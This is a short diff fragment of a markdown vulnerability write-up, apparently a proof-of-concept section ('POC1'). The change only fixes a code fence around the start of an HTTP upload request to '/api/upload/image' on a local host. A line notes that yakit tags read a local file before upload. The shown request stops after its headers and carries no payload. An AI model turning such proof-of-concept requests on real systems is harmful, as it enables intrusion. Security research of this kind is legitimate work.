@@ -94,7 +94,8 @@ POC1
 
 Note that here I'm using yakit's tags directly to read the contents of the local file 123.jpg before uploading it
 
-```POST /api/upload/image HTTP/1.1
+```
+POST /api/upload/image HTTP/1.1
 Host: 127.0.0.21
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
